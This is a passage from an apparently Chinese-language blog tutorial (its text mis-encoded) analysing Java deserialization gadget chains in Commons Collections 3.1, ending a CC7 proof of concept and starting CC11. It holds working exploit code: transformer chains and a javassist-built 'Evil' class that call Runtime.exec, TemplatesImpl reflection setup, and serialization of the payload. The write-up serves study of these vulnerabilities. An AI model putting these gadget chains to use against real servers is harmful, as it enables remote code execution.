    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//lazymap.get()->factory[constructor].transform()</span>
        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>

        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œæˆ‘ä»¬ä¼ å…¥å‡çš„transformerï¼Œå®é™…ä¸ºç©º</span>

        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>

        <span class="token class-name">Map</span> innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>


        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Field</span> field <span class="token operator">=</span> chainedTransformer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>


    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Reference-5"><a href="#Reference-5" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#Poc-4">Commons-Collections 1-7 åˆ†æ</a></p>
<h2 id="Commons-Collections-11"><a href="#Commons-Collections-11" class="headerlink" title="Commons Collections 11"></a>Commons Collections 11</h2><h3 id="å‰è¨€-3"><a href="#å‰è¨€-3" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å­¦å®Œcc1-7å¥½ä¹…ï¼Œç ”ç©¶shiro550çš„æ—¶å€™å‘ç°è¦ç”¨åˆ°cc11ï¼Œå› ä¸ºä¸€äº›åŸå› cc6ä¸èƒ½ç”¨ã€‚</p>
<p>å› æ­¤åœ¨è¿™é‡Œä¼šå¯¹cc11è¿›è¡Œè¯¦ç»†è®²è§£ï¼ŒåŒæ—¶ä¹Ÿæ˜¯å¯¹ä¹‹å‰çš„ccé“¾çš„å¤ä¹ ã€‚</p>
<p>cc11æ˜¯cc1ã€cc2ã€cc5ã€cc6çš„ç»“åˆï¼Œç”¨åˆ°äº†InvokerTransformerã€javassistå­—èŠ‚ç ç¼–å†™ã€TemplateImplå­—èŠ‚ç æ‰§è¡Œã€TiedMapEntryã€HashMapç­‰</p>
<h3 id="ç¯å¢ƒæ­å»º-7"><a href="#ç¯å¢ƒæ­å»º-7" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è¿™æ¬¡æˆ‘æ˜¯ç›´æ¥ä½¿ç”¨mavenåˆ›å»ºçš„é¡¹ç›®ï¼Œå°±ä¸ç”¨è‡ªå·±æ¥å¯¼åŒ…äº†</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>CommonsCollections11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.19.0-GA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="æ¶æ„classå­—èŠ‚ç ç¼–å†™"><a href="#æ¶æ„classå­—èŠ‚ç ç¼–å†™" class="headerlink" title="æ¶æ„classå­—èŠ‚ç ç¼–å†™"></a>æ¶æ„classå­—èŠ‚ç ç¼–å†™</h4><p>æ¯ä¸ªctClassä»£è¡¨æˆ‘ä»¬è¦ä¿®æ”¹çš„classï¼Œå› æ­¤æˆ‘ä»¬åœ¨classPoolä¸­åˆ›å»ºä¸€ä¸ªåå«Evilçš„CtClass</p>
<p>é€šè¿‡é™æ€ä»£ç å—ï¼Œæ’å…¥æ‰§è¡Œä»£ç </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>
cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>
<span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilbytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ¶æ„å­—èŠ‚ç </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="TemplatesImplåŠ è½½æ¶æ„class"><a href="#TemplatesImplåŠ è½½æ¶æ„class" class="headerlink" title="TemplatesImplåŠ è½½æ¶æ„class"></a>TemplatesImplåŠ è½½æ¶æ„class</h4><p>åœ¨TemplateImplä¸­æŸ¥æ‰¾<code>defineClass</code>å…³é”®å­—ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ClassLoaderå°±æ˜¯é€šè¿‡æ–¹æ³•**defineClass()**æ¥åŠ è½½å­—èŠ‚ç çš„ã€‚</p>
<p>é€šè¿‡ä»¥ä¸‹å›¾å¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ª<code>_tfactory</code>çš„å€¼(newä¸€ä¸ªå®ƒClassçš„æ–°å¯¹è±¡å°±å¯ä»¥)å’Œ<code>_bytecodes</code>ï¼ˆæ¶æ„å­—èŠ‚ç ï¼‰ï¼Œç„¶åå†è®©è·å–åˆ°çš„loaderæ¥callå®ƒçš„defineClass()ï¼Œä»è€Œå°†æˆ‘ä»¬çš„å­—èŠ‚ç åŠ è½½è¿›jvm</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151143793.png" alt="image-20220102151143793" loading="lazy"></p>
<p>ä¸Šé¢çš„æµç¨‹æ˜¯åœ¨defineTransletClasses()é‡Œçš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾åˆ°ä»€ä¹ˆåœ°æ–¹è°ƒç”¨äº†defineTransletClasses()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151651096.png" alt="image-20220102151651096" loading="lazy"></p>
<p>å‘ç°**getTransletInstance()<strong>è°ƒç”¨äº†</strong>defineTranslateClasses()**ï¼ŒåŒæ—¶å¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œéœ€è¦è®©<code>_name</code>ä¸ä¸ºç©ºï¼Œ<code>_class</code>ä¸ºç©º</p>
<p><strong>newTransformer()<strong>è°ƒç”¨äº†</strong>getTransletInstance()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152313976.png" alt="image-20220102152313976" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152422839.png" alt="image-20220102152422839" loading="lazy"></p>
<p><strong>getOutputProperties()<strong>è°ƒç”¨äº†</strong>newTransformer()</strong></p>
<p>å› æ­¤TemplateImplæ‰§è¡Œé¡ºåºå¦‚ä¸‹</p>
<blockquote>
<p>getOutputProperties-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTranslateClasses()-&gt;defineClass()</p>
</blockquote>
<p>é‚£ä¹ˆå…¶å®åªè¦æ‰¾åˆ°è°ƒç”¨TemplatesImpl#getOutputPropertiesæˆ–è€…TemplatesImpl#newTransformer()çš„åœ°æ–¹å°±å¯ä»¥è¿æ¥ä¸Šäº†ã€‚</p>
<p>æˆ‘ä»¬å…ˆç¼–å†™ä¸€äº›TemplatesImplçš„éƒ¨åˆ†</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">      <span class="token comment">/*é…ç½®TemplatesImpl - åŠ è½½æ¶æ„classåˆ°jvm*/</span>
      <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>evilbytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä¼ å…¥çš„evilbyteséœ€è¦åœ¨byte[][]ä¸­</span>
      <span class="token class-name">Field</span> name <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"LeiHello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">Field</span> tfactory <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ä»»æ„æ–¹æ³•è°ƒç”¨templates.newTransformer()æˆ–è€…templates.getOutputPropertieså³å¯è§¦å‘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="InvokerTransformer-1"><a href="#InvokerTransformer-1" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>å·²çŸ¥TemplatesImpl#getOutputPropertiesæˆ–è€…TemplatesImpl#newTransformer()ä»»æ„ä¸€ä¸ªæ–¹æ³•è¢«è°ƒç”¨éƒ½å¯ä»¥è§¦å‘ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥<code>newTrasnformer()</code>ä¸ºä¾‹</p>
<p>çœ‹ä¸€ä¸‹è°ƒç”¨çš„æƒ…å†µ:</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102154928181.png" alt="image-20220102154928181" loading="lazy"></p>
<p>åœ¨ä¹‹å‰çš„cc3ä¸­å·²ç»åˆ†æè¿‡äº†<code>TrAXFilter()</code>çš„è°ƒç”¨ï¼Œåœ¨cc11é‡Œæˆ‘ä»¬ä¸å†ä½¿ç”¨è¯¥é“¾ã€‚</p>
<p>è¿˜è®°å¾—InvokerTransformerå—ï¼Œå®ƒæ˜¯åœ¨commons-collections 3.1ç‰ˆæœ¬ä¸­å­˜åœ¨çš„æœ€ä¸ºç»å¸¸è¢«ä½¿ç”¨çš„ä¸€ä¸ªç±»ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥ç±»callä»»æ„æ–¹æ³•ã€‚</p>
<p>å†æ¥å›é¡¾ä¸€ä¸‹<strong>InvokerTransformer#transform</strong>æ–¹æ³•</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102155548083.png" alt="image-20220102155548083" loading="lazy"></p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·å†™</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨ä¹‹å‰å¯¹ccé“¾çš„åˆ†æä¸­ï¼Œåç»­çš„åˆ©ç”¨å¯¼è‡´åœ¨ç”Ÿæˆpayloadé˜¶æ®µå°±è§¦å‘äº†æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿™é‡Œåº”è¯¥å…ˆéšæ„å†™ä¸€ä¸ªmethodä½œä¸ºå ä½ï¼Œä¹‹åå†è¿›è¡Œä¿®æ”¹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getClass"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ¥ä¸‹æ¥å¯»æ‰¾è°ƒç”¨invokerTransformer#transformçš„æ–¹æ³•ï¼ŒåŒæ—¶èƒ½å¤Ÿä¼ å…¥input=<code>templates</code>(æˆ‘ä»¬çš„æ¶æ„class)</p>
<h4 id="LazyMap-2"><a href="#LazyMap-2" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>è¿™é‡Œä¸å†åƒä¹‹å‰çš„ccé“¾ä¸€æ ·ä½¿ç”¨ChainedTransformerï¼Œç›¸åæˆ‘ä»¬ä½¿ç”¨LazyMapæ¥ç»§ç»­å®Œæˆè¿™ä¸ªé“¾ã€‚LazyMapæœ‰ä¸€ä¸ªget()æ–¹æ³•ï¼š</p>
